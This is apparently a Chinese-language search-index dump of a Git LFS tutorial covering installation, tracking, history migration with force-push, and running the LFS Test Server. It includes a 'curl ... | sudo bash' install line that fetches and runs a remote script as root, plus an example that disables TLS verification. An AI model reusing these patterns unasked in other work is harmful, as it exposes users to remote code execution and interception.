\uf0c1 \u76f4\u63a5\u83b7\u5f97\u6709\u5173\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\uff1a $ git lfs help <subcommand> \u5b98\u65b9\u6587\u6863 \u6709\u8be5\u5de5\u5177\u7684\u547d\u4ee4\u53c2\u8003\u548c\u89c4\u8303\u3002wiki \u4e0a\u8fd8\u6709\u4e00\u4e2a \u5e38\u89c1\u95ee\u9898\u89e3\u7b54 \uff0c\u5b83\u56de\u7b54\u4e86\u4e00\u4e9b\u5e38\u89c1\u95ee\u9898\u3002 \u5982\u679c\u60a8\u5bf9\u5982\u4f55\u4f7f\u7528 Git LFS \u6709\u7591\u95ee\uff0c\u4e0d\u786e\u5b9a\u67d0\u4e8b\uff0c\u6216\u8005\u6b63\u5728\u5bfb\u627e\u5176\u4ed6\u4eba\u5173\u4e8e\u6700\u4f73\u5b9e\u8df5\u6216\u7528\u4f8b\u63d0\u793a\u7684\u8f93\u5165\uff0c\u8bf7\u968f\u65f6 \u5f00\u59cb\u8ba8\u8bba \u3002 \u60a8\u53ef\u4ee5\u968f\u65f6 \u6253\u5f00\u95ee\u9898 \uff0c\u5176\u4e2d\u4e00\u4f4d\u6838\u5fc3\u56e2\u961f\u6210\u5458\u4f1a\u56de\u590d\u60a8\u3002 LFS Test Server \uf0c1 LFS Test Server \u662f\u4e00\u4e2a\u5b9e\u73b0 Git LFS API \u7684\u793a\u4f8b\u670d\u52a1\u5668\u3002\u5b83\u65e8\u5728\u7528\u4e8e\u6d4b\u8bd5 Git LFS \u5ba2\u6237\u7aef\uff0c\u5e76\u672a\u5904\u4e8e\u751f\u4ea7\u5c31\u7eea\u72b6\u6001\u3002 LFS Test Server \u662f\u7528 Go \u7f16\u5199\u7684\uff0c\u9884\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u7528\u4e8e Mac\u3001Windows\u3001Linux \u548c FreeBSD\u3002 \u81ea\u5efa LFS Server \u8bf7\u53c2\u8003: LFS Test Server \u5b89\u88c5 \uf0c1 \u4f7f\u7528 Go \u5b89\u88c5\u7a0b\u5e8f: $ go install github.com/github/lfs-test-server # or $ go install github.com/github/lfs-test-server@latest \u4ece\u6e90\u4ee3\u7801\u5b89\u88c5\uff0c\u8bf7\u4f7f\u7528 Go \u5de5\u5177: $ go get github.com/github/lfs-test-server $ go build \u8fd0\u884c \uf0c1 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd0\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u542f\u52a8 LFS \u670d\u52a1\u5668 localhost:8080 \u3002\u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u914d\u7f6e\u7684\u4e1c\u897f\u5f88\u5c11\uff1a LFS_LISTEN # The address:port the server listens on, default: \"tcp://:8080\" LFS_HOST # The host used when the server generates URLs, default: \"localhost:8080\" LFS_METADB # The database file the server uses to store meta information, default: \"lfs.db\" LFS_CONTENTPATH # The path where LFS files are store, default: \"lfs-content\" LFS_ADMINUSER # An administrator username, default: not set LFS_ADMINPASS # An administrator password, default: not set LFS_CERT # Certificate file for tls LFS_KEY # tls key LFS_SCHEME # set to 'https' to override default http LFS_USETUS # set to 'true' to enable tusd (tus.io) resumable upload server; tusd must be on PATH, installed separately LFS_TUSHOST # The host used to start the tusd upload server, default \"localhost:1080\" \u5982\u679c\u8bbe\u7f6e\u4e86 LFS_ADMINUSER \u548c LFS_ADMINPASS \u53d8\u91cf\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7 \u8bbf\u95ee\u57fa\u672c\u7684\u7ba1\u7406\u754c\u9762 http://$LFS_HOST/mgmt \u3002\u5728\u8fd9\u91cc\u60a8\u53ef\u4ee5\u6dfb\u52a0\u548c\u5220\u9664\u7528\u6237\uff0c\u8fd9\u5fc5\u987b\u5728\u60a8\u53ef\u4ee5\u5c06\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u4e00\u8d77\u4f7f\u7528\u4e4b\u524d\u5b8c\u6210\u3002\u5982\u679c\u672a\u8bbe\u7f6e\u8fd9\u4e9b\u53d8\u91cf\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\uff08\u8fd9\u662f\u9ed8\u8ba4\u8bbe\u7f6e\uff09\uff0c\u5219\u7981\u7528\u7ba1\u7406\u754c\u9762\u3002 \u8981\u5c06 LFS \u6d4b\u8bd5\u670d\u52a1\u5668\u4e0e Git LFS \u5ba2\u6237\u7aef\u4e00\u8d77\u4f7f\u7528\uff0c\u8bf7\u5728\u5b58\u50a8\u5e93\u7684 .gitconfig \u6587\u4ef6\u4e2d\u5bf9\u5176\u8fdb\u884c\u914d\u7f6e\uff1a [lfs] url = \"http://localhost:8080/\" HTTPS\uff1a \u6ce8\u610f\uff1a\u5982\u679c\u5c06 https \u4e0e\u81ea\u7b7e\u540d\u8bc1\u4e66\u4e00\u8d77\u4f7f\u7528\uff0c\u4e5f\u4f1a\u5728\u5ba2\u6237\u7aef repo \u4e2d\u7981\u7528\u8bc1\u4e66\u68c0\u67e5\u3002 [lfs] url = \"https://localhost:8080/\" [http] sslverify = false \u793a\u4f8b\u7528\u6cd5 \uf0c1 \u751f\u6210\u5bc6\u94a5\u5bf9 openssl req -x509 -sha256 -nodes -days 2100 -newkey rsa:2048 -keyout mine.key -out mine.crt \u521b\u5efa\u4e00\u4e2a\u8fd0\u884c\u811a\u6b65 #!/bin/bash set -eu set -o pipefail LFS_LISTEN=\"tcp://:9999\" LFS_HOST=\"127.0.0.1:9999\" LFS_CONTENTPATH=\"content\" LFS_ADMINUSER=\"<cool admin user name>\" LFS_ADMINPASS=\"<better admin password>\" LFS_CERT=\"mine.crt\" LFS_KEY=\"mine.key\" LFS_SCHEME=\"https\" export LFS_LISTEN LFS_HOST LFS_CONTENTPATH LFS_ADMINUSER LFS_ADMINPASS LFS_CERT LFS_KEY LFS_SCHEME ./lfs-test-server \u5728\u6d4f\u89c8\u5668\u6253\u5f00\u7ba1\u7406\u9875\u9762\uff1a https://localhost:9999/mgmt \u603b\u7ed3 \uf0c1 Git LFS\u662f\u4e00\u4e2a\u6613\u4e8e\u5b89\u88c5\u3001\u6613\u4e8e\u914d\u7f6e\uff0c\u4f7f\u7528\u9ad8\u6548\u7684Git\u62d3\u5c55\u5de5\u5177\uff0c\u5b83\u80fd\u6709\u6548\u7684\u7ba1\u7406\u4ed3\u5e93\u4e2d\u7684\u5927\u6587\u4ef6\uff0c \u907f\u514d\u4ed3\u5e93\u4f53\u79ef\u8fc7\u5927\uff0c\u5f71\u54cd\u9879\u76ee\u7ba1\u7406\u6548\u7387\u3002\u540c\u65f6\uff0cGitee\u5e73\u53f0\u5bf9Git LFS\u529f\u80fd\u6709\u5f88\u597d\u7684\u652f\u6301\uff0c\u518d\u52a0\u4e0a\u7075 \u6d3b\u7684\u7a7a\u95f4\u914d\u989d\u7ba1\u7406\uff0c\u8ba9\u4f01\u4e1a\u5b9e\u73b0\u81ea\u52a8\u6269\u5bb9\uff0c\u65b9\u4fbf\u7684\u89e3\u51b3\u4e86\u4f01\u4e1a\u5728\u9879\u76ee\u5f00\u53d1\u4e2d\u9047\u5230\u7684\u4ed3\u5e93\u5927\u6587\u4ef6\u95ee\u9898\u3002 \u53c2\u8003\u94fe\u63a5 \uf0c1 Git Large File Storage Git LFS Wiki gitattributes Git LFS \u64cd\u4f5c\u6307\u5357","title":"Git LFS"},{"location":"git/git_lfs/#git-lfs","text":"Git LFS \u662f Github \u5f00\u53d1\u7684\u4e00\u4e2a Git \u7684\u6269\u5c55\uff0c\u7528\u4e8e\u5b9e\u73b0 Git \u5bf9\u5927\u6587\u4ef6\u7684\u652f\u6301\u3002","title":"Git LFS"},{"location":"git/git_lfs/#purpose","text":"\u6709\u4e9b\u7528\u6237\uff0c\u5c24\u5176\u662f\u6e38\u620f\u884c\u4e1a\u4ee5\u53ca\u5a92\u4f53\u884c\u4e1a\u4eba\u5458\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e2a\u95ee\u9898\uff0c\u90a3\u5c31\u662f\u968f\u7740\u63d0\u4ea4\u7684\u6587\u4ef6\u8d8a\u6765\u8d8a\u591a\uff0c\u9879\u76ee \u8d8a\u6765\u8d8a\u5927\uff0cGit\u7684\u54cd\u5e94\u901f\u5ea6\u8d8a\u6765\u8d8a\u6162\uff0c\u66f4\u70e6\u4eba\u7684\u662f\uff0c\u5728\u63d0\u4ea4\u5230\u8fdc\u7a0b\u4ed3\u5e93\u7684\u6700\u540e\u4e00\u523b\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u63d0\u793a\u7528\u6237\u6b64\u6b21 \u63d0\u4ea4\u88ab\u62d2\u7edd\uff0c\u539f\u56e0\u662f\u63d0\u4ea4\u7684\u6587\u4ef6\u592a\u5927\uff0c\u89e6\u53d1\u5e73\u53f0\u989d\u5ea6\u9650\u5236(\u65e0\u8bba\u662f\u54ea\u4e2a\u5e73\u53f0)\uff0c\u76f8\u4fe1\u5f88\u591a\u4eba\u5728\u8fd9\u4e00\u523b\u662f\u5d29\u6e83\u7684\u3002 Git LFS(Git Large File Storage)\uff0c\u5373Git\u5927\u6587\u4ef6\u5b58\u50a8\u6280\u672f\u3002 \u5728Git\u4ed3\u5e93\u4e2d\uff0c\u5bf9\u4e8e\u975e\u6587\u672c\u6587\u4ef6\uff0c\u5982\u5404\u79cd\u591a\u5a92\u4f53\u6587\u4ef6\uff0c\u8f6f\u4ef6\u5236\u54c1\u6587\u4ef6\uff0c\u4e8c\u8fdb\u5236\u6587\u4ef6\u7b49\u7b49\uff0c\u8fd9\u4e9b\u6587\u4ef6 \u5f80\u5f80\u4f53\u79ef\u6bd4\u8f83\u5927\uff0c\u4f7f\u7528Git\u76f4\u63a5\u7ba1\u7406\u4f1a\u5bfc\u81f4\u4ed3\u5e93\u7684\u4f53\u79ef\u8fc5\u901f\u81a8\u80c0\uff0c\u8fdb\u800c\u5bfc\u81f4Git\u7684\u8bb8\u591a\u64cd\u4f5c\u53d8\u6162\uff0c\u540c \u65f6\u4e5f\u5f71\u54cd\u4ed3\u5e93\u4e0a\u4f20\u5230\u8fdc\u7a0b\u7aef\u3002 Git LFS\u76f8\u5f53\u4e8eGit\u7684\u4e00\u79cd\u63d2\u4ef6\u5f0f\u589e\u5f3a\u5de5\u5177\uff0c\u7b80\u5355\u8bb2\uff0c\u5b83\u662f\u5728Git\u4ed3\u5e93\u4f7f\u7528\u8fd9\u4e9b\u6587\u4ef6\u7684 \u6307\u9488 \u4ee3\u66ff \u5b9e\u9645\u6587\u4ef6 \uff0c \u800c\u628a\u5b9e\u9645\u6587\u4ef6\u5b58\u50a8\u5728\u8fdc\u7a0b\u7aefLFS\u670d\u52a1\u5668\uff0c\u540c\u65f6\u5728\u672c\u5730\u4ed3\u5e93\u4e2d\u5b9e\u65f6\u8ffd\u8e2a\u8fd9\u4e9b\u6587\u4ef6\u7684\u53d8\u52a8\u3002","title":"\u4f7f\u7528\u76ee\u7684"},{"location":"git/git_lfs/#principle","text":"\u6839\u636e Git LFS \u5b98\u65b9\u5e2e\u52a9\u6587\u6863\u63cf\u8ff0\uff1a Git LFS\u662f\u57fa\u4e8eGit\u7684 .gitattributs \u914d\u7f6e\u6587\u4ef6\u7684\u7279\u6027\uff0c\u7528 smudge \u8fc7\u6ee4\u5668\u57fa\u4e8e \u6307\u9488\u6587\u4ef6 \u5bfb\u627e\u5927\u6587\u4ef6\u5185 \u5bb9\uff0c \u7528 clean \u8fc7\u6ee4\u5668\u5728\u5bf9\u5927\u6587\u4ef6\u6539\u52a8\u65f6\uff0c\u521b\u5efa\u6307\u9488\u6587\u4ef6\u7684\u65b0\u7248\u672c\u3002\u540c\u65f6\u8fd8\u7528 pre-push \u94a9\u5b50\u5c06\u5927\u6587\u4ef6\u4e0a\u4f20 \u5230Git LFS\u670d\u52a1\u5668\uff0c \u5373\u5728 git-push \u65f6\uff0c \u5982\u679c\u63d0\u4ea4\u4e2d\u5305\u542b\u88abLFS\u8ddf\u8e2a\u7684\u5927\u6587\u4ef6\uff0c pre-push \u94a9\u5b50\u4f1a\u68c0\u6d4b \u5230\uff0c\u5e76\u6267\u884c\u4e0a\u4f20Git LFS\u670d\u52a1\u5668\u7684\u52a8\u4f5c\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u4ed3\u5e93\u4e2d\u5305\u542bLFS\u5185\u5bb9\uff0c\u4f46\u662f\u5728\u63a8\u9001\u65f6\u4e0d\u60f3\u63a8\u9001\u8fd9\u7c7b\u6587\u4ef6\uff0c\u53ea\u8981\u52a0\u4e0a --no-verify \u9009\u9879\u5c31\u884c\uff0c\u5373\uff1a $ git push --no-verify --no-verify \u9009\u9879\u544a\u8bc9 git push \u5b8c\u5168\u8df3\u8fc7 pre-push \u94a9\u5b50\u3002 \u524d\u9762\u63d0\u5230\u88abLFS\u7ba1\u7406\u7684\u6587\u4ef6\uff0c\u672c\u5730\u4ed3\u5e93\u4e2d\u4fdd\u5b58\u7684\u5185\u5bb9\u5b9e\u9645\u4e0a\u662f\u6307\u9488\u6587\u4ef6\uff0c\u5176\u683c\u5f0f\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u8fd9\u6837\uff1a $ git show HEAD:2.svg version https://git-lfs.github.com/spec/v1 oid sha256:158213f90f8b27012034c6f58db63e1861b12aa122d98910de311bf1cb1e50a0 size 14651 (END) version \u8868\u793aLFS\u7684\u7248\u672c oid \u8868\u793a\u6587\u4ef6\u5bf9\u8c61\u7684\u552f\u4e00hash\u503c size \u8868\u793a\u6587\u4ef6\u7684\u5927\u5c0f","title":"\u539f\u7406"},{"location":"git/git_lfs/#install","text":"\u6ce8\u610f\uff1a\u4ee5\u4e0b\u5b89\u88c5\u4ee5\u53ca\u547d\u4ee4\u4f7f\u7528\u6f14\u793a\uff0c\u5747\u662f\u57fa\u4e8eLinux\u4e2d\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u8fdb\u884c\uff0cWindows\u4e0a\u7684\u56fe\u50cf\u754c\u9762 \u64cd\u4f5c\uff0c\u7531\u4e8e\u65f6\u95f4\u5173\u7cfb\uff0c\u6682\u4e0d\u6d89\u53ca\u3002 \u5b89\u88c5\u4f9d\u8d56\uff1a Git >=1.8.5 Linux \u7cfb\u7edf\uff1a curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | sudo bash sudo apt-get install git-lfs https://packagecloud.io/github/git-lfs/install#bash \u5176\u5b83\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u5b89\u88c5\uff0c\u89c1\u5b98\u65b9\u5b89\u88c5\u6587\u6863\uff1a https://github.com/git-lfs/git-lfs#installing","title":"\u5b89\u88c5"},{"location":"git/git_lfs/#usage","text":"\u5728Git\u4ed3\u5e93\u4e2d\u4e3a\u4ed3\u5e93\u8bbe\u7f6e\u76f8\u5173\u914d\u7f6e\uff1a $ git lfs install Tips: \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u81ea\u52a8\u6539\u53d8Git\u914d\u7f6e\u6587\u4ef6 .gitconfig\uff0c\u800c\u4e14\u662f\u5168\u5c40\u6027\u8d28\u7684\uff0c\u4f1a\u81ea\u52a8\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u589e\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a [filter \"lfs\"] clean = git-lfs clean -- %f smudge = git-lfs smudge -- %f process = git-lfs filter-process required = true \u9009\u62e9\u8981\u7528LFS\u8ffd\u8e2a\u7684\u6587\u4ef6\uff1a $ git lfs track \"*.svg\" # \u6216\u8005\u5177\u4f53\u5230\u67d0\u4e2a\u6587\u4ef6 $ git lfs track \"2.png\" $ git lfs track \"example.lfs\" Tips: \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u66f4\u6539\u4ed3\u5e93\u4e2d\u7684 .gitattributes\u914d\u7f6e\u6587\u4ef6(\u5982\u679c\u4e4b\u524d\u4e0d\u5b58\u5728\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5219\u4f1a\u81ea\u52a8\u65b0\u5efa): \u67e5\u770b\u5982\u4e0b\uff1a $ cat .gitattributes *.svg filter=lfs diff=lfs merge=lfs -text *.png filter=lfs diff=lfs merge=lfs -text \u67e5\u770b\u6b63\u5728\u88abLFS\u8ffd\u8e2a\u7684\u6587\u4ef6\uff1a $ git lfs ls-files 9a3c7dae41 * 1.png d61cf5835a * 2.png 158213f90f * 3.svg git add file \u4e4b\u540e\u6587\u4ef6\u624d\u53ef\u80fd\u88ab\u8ffd\u8e2a\uff0c\u4e5f\u624d\u80fd\u67e5\u770b\u5f97\u5230 \u53d6\u6d88LFS\u8ffd\u8e2a\u7684\u6587\u4ef6: $ git lfs untrack \"1.png\" \u4fdd\u5b58\u5e76\u63d0\u4ea4\u914d\u7f6e\uff1a $ git add .gitattributes $ git commit -m \"add .gitattributes\"","title":"\u7528\u6cd5"},{"location":"git/git_lfs/#usage-summary","text":"\u5b89\u88c5Git LFS\u4e4b\u540e\uff0c\u53ea\u9700\u4e09\u6b65\uff0c\u5373\u53ef\u5728\u4ed3\u5e93\u4e2d\u914d\u7f6eLFS\u529f\u80fd\uff0c\u5373\uff1a #step 1 $ git lfs install #step 2 $ git lfs track files # step 3 $ git add .gitattributes \u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e\u7b2c\u4e00\u6b65\u662f\u5168\u5c40\u914d\u7f6e\uff0c\u6240\u4ee5\u6267\u884c\u4e00\u6b21\u5373\u53ef\uff0c\u540e\u7eed\u6709\u5176\u5b83\u4ed3\u5e93\u9700\u8981\u4f7f\u7528LFS\uff0c\u5219\u4e0d\u9700\u8981\u518d\u6b21\u6267\u884c\uff0c\u9664\u975e\u4e2d\u9014\u53d6\u6d88\u4e86LFS\u914d\u7f6e\u3002 Tips\uff1a \u8fd0\u884c git lfs uninstall \u5373\u53ef\u53d6\u6d88LFS\u7684\u5168\u5c40\u914d\u7f6e","title":"\u7528\u6cd5\u603b\u7ed3"},{"location":"git/git_lfs/#example-usage","text":"\u5982\u679c\u4e00\u4e2a\u4ed3\u5e93\u4e2d\u539f\u6765\u5df2\u7ecf\u63d0\u4ea4\u4e86\u4e00\u4e9b\u5927\u6587\u4ef6\uff0c\u6b64\u65f6\u5373\u4f7f\u8fd0\u884c git lfs track \u4e5f\u4e0d\u4f1a\u6709\u6548\u7684\u3002 \u4e3a\u4e86\u5c06\u4ed3\u5e93\u4e2d\u73b0\u5b58\u7684\u5927\u6587\u4ef6\u5e94\u7528\u5230LFS\uff0c\u9700\u8981\u7528 git lfs migrate \u5bfc\u5165\u5230LFS\u4e2d\uff1a $ git lfs migrate import --include-ref=master --include=\"biger.zip\" migrate: override changes in your working copy? All uncommitted changes will be lost! [y/N] y migrate: changes in your working copy will be overridden ... migrate: Sorting commits: ..., done. migrate: Rewriting commits: 100% (11/11), done. master f9be3c554e9010ea5e0e23a6a0c6e53dca6c23b0 -> 53d5e655fe7cfd985f75384b92ac5414ad2ff394 migrate: Updating refs: ..., done. migrate: checkout: ..., done. --include-ref \u9009\u9879\u6307\u5b9a\u5bfc\u5165\u7684\u5206\u652f \u5982\u679c\u5411\u5e94\u7528\u5230\u6240\u6709\u5206\u652f\uff0c\u5219\u4f7f\u7528--everything\u9009\u9879 --include \u9009\u9879\u6307\u5b9a\u8981\u5bfc\u5165\u7684\u6587\u4ef6\u3002\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\uff0c\u6279\u91cf\u5bfc\u5165\u3002 \u4e0a\u8ff0\u64cd\u4f5c\u4f1a\u6539\u5199\u63d0\u4ea4\u5386\u53f2\uff0c\u5982\u679c\u4e0d\u60f3\u6539\u5199\u5386\u53f2\uff0c\u5219\u4f7f\u7528 --no-rewrite \u9009\u9879\uff0c\u5e76\u63d0\u4f9b\u65b0\u7684commit\u4fe1\u606f\uff1a $ git lfs migrate import --no-rewrite -m \"lfs import\" \u5c06\u672c\u5730\u5386\u53f2\u63d0\u4ea4\u4e2d\u7684\u6587\u4ef6\u7eb3\u5165\u5230LFS\u7ba1\u7406\u540e\uff0c\u5982\u679c\u91cd\u6539\u4e86\u5386\u53f2\uff0c\u518d\u6b21\u63a8\u9001\u4ee3\u7801\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u5f3a\u5236\u63a8\u9001\u3002 \u8fd9\u91cc\u9009\u62e9\u6539\u53d8\u63d0\u4ea4\u5386\u53f2\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u4f7f\u7528 --force \u5f3a\u5236\u63a8\u9001\uff1a $ git push origin master --force Enter passphrase for key '/home/git/.ssh/id_ed25519': Locking support detected on remote \"origin\". Consider enabling it with: $ git config lfs.https://gitee.com/hightest/lfs-demo.git/info/lfs.locksverify true Uploading LFS objects: 100% (8/8), 419 MB | 0 B/s, done. Enumerating objects: 38, done. Counting objects: 100% (38/38), done. Delta compression using up to 6 threads Compressing objects: 100% (37/37), done. Writing objects: 100% (38/38), 136.26 MiB | 943.00 KiB/s, done. Total 38 (delta 12), reused 10 (delta 0), pack-reused 0 remote: Powered by GITEE.COM [GNK-6.1] To gitee.com:hightest/lfs-demo.git + cefd169...53d5e65 master -> master (forced update) \u81f3\u6b64\uff0c\u5df2\u7ecf\u5c06\u5386\u53f2\u63d0\u4ea4\u4e2d\u7684\u5927\u6587\u4ef6\u8fc1\u79fb\u5230\u8fdc\u7a0bLFS\u670d\u52a1\u5668\uff0c\u672c\u5730Git\u4ed3\u5e93\uff0c\u53ea\u4fdd\u7559\u8fd9\u4e2a\u5927\u6587\u4ef6\u7684\u6307\u9488 \u6587\u4ef6\uff0c\u6240\u4ee5\u63a8\u9001\u4e5f\u4e0d\u4f1a\u518d\u89e6\u53d1\u989d\u5ea6\u9650\u5236\u3002\u63a8\u9001\u6210\u529f\u4e4b\u540e\uff0c\u8fdc\u7a0b\u4ed3\u5e93\u5c31\u4e0e\u672c\u5730\u4fdd\u5b58\u4e00\u81f4\uff0c\u5b83\u53ea\u7ba1\u7406\u8fd9\u4e2a\u5927\u6587\u4ef6\u7684\u6307\u9488\u6587\u4ef6\u3002","title":"\u4f7f\u7528LFS\u7ba1\u7406\u5386\u53f2\u5927\u6587\u4ef6"},{"location":"git/git_lfs/#help-command","text":"\u76f4\u63a5\u83b7\u5f97\u6709\u5173\u7279\u5b9a\u547d\u4ee4\u7684\u5e2e\u52a9\uff1a $ git lfs help <subcommand> \u5b98\u65b9\u6587\u6863 \u6709\u8be5\u5de5\u5177\u7684\u547d\u4ee4\u53c2\u8003\u548c\u89c4\u8303\u3002wiki \u4e0a\u8fd8\u6709\u4e00\u4e2a \u5e38\u89c1\u95ee\u9898\u89e3\u7b54 \uff0c\u5b83\u56de\u7b54\u4e86\u4e00\u4e9b\u5e38\u89c1\u95ee\u9898\u3002 \u5982\u679c\u60a8\u5bf9\u5982\u4f55\u4f7f\u7528 Git LFS \u6709\u7591\u95ee\uff0c\u4e0d\u786e\u5b9a\u67d0\u4e8b\uff0c\u6216\u8005\u6b63\u5728\u5bfb\u627e\u5176\u4ed6\u4eba\u5173\u4e8e\u6700\u4f73\u5b9e\u8df5\u6216\u7528\u4f8b\u63d0\u793a\u7684\u8f93\u5165\uff0c\u8bf7\u968f\u65f6 \u5f00\u59cb\u8ba8\u8bba \u3002 \u60a8\u53ef\u4ee5\u968f\u65f6 \u6253\u5f00\u95ee\u9898 \uff0c\u5176\u4e2d\u4e00\u4f4d\u6838\u5fc3\u56e2\u961f\u6210\u5458\u4f1a\u56de\u590d\u60a8\u3002","title":"\u5e2e\u52a9\u547d\u4ee4"},{"location":"git/git_lfs/#lfs-test-server","text":"LFS Test Server \u662f\u4e00\u4e2a\u5b9e\u73b0 Git LFS API \u7684\u793a\u4f8b\u670d\u52a1\u5668\u3002\u5b83\u65e8\u5728\u7528\u4e8e\u6d4b\u8bd5 Git LFS \u5ba2\u6237\u7aef\uff0c\u5e76\u672a\u5904\u4e8e\u751f\u4ea7\u5c31\u7eea\u72b6\u6001\u3002 LFS Test Server \u662f\u7528 Go \u7f16\u5199\u7684\uff0c\u9884\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u7528\u4e8e Mac\u3001Windows\u3001Linux \u548c FreeBSD\u3002 \u81ea\u5efa LFS Server \u8bf7\u53c2\u8003: LFS Test Server","title":"LFS Test Server"},{"location":"git/git_lfs/#install-lfs-server","text":"\u4f7f\u7528 Go \u5b89\u88c5\u7a0b\u5e8f: $ go install github.com/github/lfs-test-server # or $ go install github.com/github/lfs-test-server@latest \u4ece\u6e90\u4ee3\u7801\u5b89\u88c5\uff0c\u8bf7\u4f7f\u7528 Go \u5de5\u5177: $ go get github.com/github/lfs-test-server $ go build","title":"\u5b89\u88c5"},{"location":"git/git_lfs/#run-lfs-server","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd0\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u542f\u52a8 LFS \u670d\u52a1\u5668 localhost:8080 \u3002\u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u914d\u7f6e\u7684\u4e1c\u897f\u5f88\u5c11\uff1a LFS_LISTEN # The address:port the server listens on, default: \"tcp://:8080\" LFS_HOST # The host used when the server generates URLs, default: \"localhost:8080\" LFS_METADB # The database file the server uses to store meta information, default: \"lfs.db\" LFS_CONTENTPATH # The path where LFS files are store, default: \"lfs-content\" LFS_ADMINUSER # An administrator username, default: not set LFS_ADMINPASS # An administrator password, default: not set LFS_CERT # Certificate file for tls LFS_KEY # tls key LFS_SCHEME # set to 'https' to override default http LFS_USETUS # set to 'true' to enable tusd (tus.io) resumable upload server; tusd must be on PATH, installed separately LFS_TUSHOST # The host used to start the tusd upload server, default \"localhost:1080\" \u5982\u679c\u8bbe\u7f6e\u4e86 LFS_ADMINUSER \u548c LFS_ADMINPASS \u53d8\u91cf\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7 \u8bbf\u95ee\u57fa\u672c\u7684\u7ba1\u7406\u754c\u9762 http://$LFS_HOST/mgmt \u3002\u5728\u8fd9\u91cc\u60a8\u53ef\u4ee5\u6dfb\u52a0\u548c\u5220\u9664\u7528\u6237\uff0c\u8fd9\u5fc5\u987b\u5728\u60a8\u53ef\u4ee5\u5c06\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u4e00\u8d77\u4f7f\u7528\u4e4b\u524d\u5b8c\u6210\u3002\u5982\u679c\u672a\u8bbe\u7f6e\u8fd9\u4e9b\u53d8\u91cf\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\uff08\u8fd9\u662f\u9ed8\u8ba4\u8bbe\u7f6e\uff09\uff0c\u5219\u7981\u7528\u7ba1\u7406\u754c\u9762\u3002 \u8981\u5c06 LFS \u6d4b\u8bd5\u670d\u52a1\u5668\u4e0e Git LFS \u5ba2\u6237\u7aef\u4e00\u8d77\u4f7f\u7528\uff0c\u8bf7\u5728\u5b58\u50a8\u5e93\u7684 .gitconfig \u6587\u4ef6\u4e2d\u5bf9\u5176\u8fdb\u884c\u914d\u7f6e\uff1a [lfs] url = \"http://localhost:8080/\" HTTPS\uff1a \u6ce8\u610f\uff1a\u5982\u679c\u5c06 https \u4e0e\u81ea\u7b7e\u540d\u8bc1\u4e66\u4e00\u8d77\u4f7f\u7528\uff0c\u4e5f\u4f1a\u5728\u5ba2\u6237\u7aef repo \u4e2d\u7981\u7528\u8bc1\u4e66\u68c0\u67e5\u3002 [lfs] url = \"https://localhost:8080/\" [http] sslverify = false","title":"\u8fd0\u884c"},{"location":"git/git_lfs/#lfs-server-example","text":"\u751f\u6210\u5bc6\u94a5\u5bf9 openssl req -x509 -sha256 -nodes -days 2100 -newkey rsa:2048 -keyout mine.key -out mine.crt \u521b\u5efa\u4e00\u4e2a\u8fd0\u884c\u811a\u6b65 #!/bin/bash set -eu set -o pipefail LFS_LISTEN=\"tcp://:9999\" LFS_HOST=\"127.0.0.1:9999\" LFS_CONTENTPATH=\"content\" LFS_ADMINUSER=\"<cool admin user name>\" LFS_ADMINPASS=\"<better admin password>\" LFS_CERT=\"mine.crt\" LFS_KEY=\"mine.key\" LFS_SCHEME=\"https\" export LFS_LISTEN LFS_HOST LFS_CONTENTPATH LFS_ADMINUSER LFS_ADMINPASS LFS_CERT LFS_KEY LFS_SCHEME ./lfs-test-server \u5728\u6d4f\u89c8\u5668\u6253\u5f00\u7ba1\u7406\u9875\u9762\uff1a https://localhost:9999/mgmt","title":"\u793a\u4f8b\u7528\u6cd5"},{"location":"git/git_lfs/#summary","text":"Git LFS\u662f\u4e00\u4e2a\u6613\u4e8e\u5b89\u88c5\u3001\u6613\u4e8e\u914d\u7f6e\uff0c\u4f7f\u7528\u9ad8\u6548\u7684Git\u62d3\u5c55\u5de5\u5177\uff0c\u5b83\u80fd\u6709\u6548\u7684\u7ba1\u7406\u4ed3\u5e93\u4e2d\u7684\u5927\u6587\u4ef6\uff0c \u907f\u514d\u4ed3\u5e93\u4f53\u79ef\u8fc7\u5927\uff0c\u5f71\u54cd\u9879\u76ee\u7ba1\u7406\u6548\u7387\u3002\u540c\u65f6\uff0cGitee\u5e73\u53f0\u5bf9Git LFS\u529f\u80fd\u6709\u5f88\u597d\u7684\u652f\u6301\uff0c\u518d\u52a0\u4e0a\u7075 